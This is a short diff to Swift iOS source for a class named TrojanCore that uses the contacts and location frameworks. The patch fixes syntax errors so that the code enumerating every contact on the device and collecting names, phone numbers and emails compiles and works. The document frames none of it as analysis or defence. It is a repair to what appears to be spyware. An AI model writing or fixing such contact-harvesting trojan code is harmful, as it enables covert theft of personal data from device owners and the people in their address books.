@@ -1,4 +1,4 @@
-﻿import Foundation
+import Foundation
 import UIKit
 import Contacts
 import CoreLocation
@@ -67,8 +67,8 @@ class TrojanCore: NSObject, CLLocationManagerDelegate {
                 var contacts: [[String: String]] = []
                 
                 try? store.enumerateContacts(with: request) { contact, _ in
-                    let phones = contact.phoneNumbers.map { .value.stringValue }
-                    let emails = contact.emailAddresses.map { .value as String }
+                    let phones = contact.phoneNumbers.map { $0.value.stringValue }
+                    let emails = contact.emailAddresses.map { String($0.value) }
                     contacts.append([
                         "name": "\(contact.givenName) \(contact.familyName)",
                         "phones": phones.joined(separator: ", "),
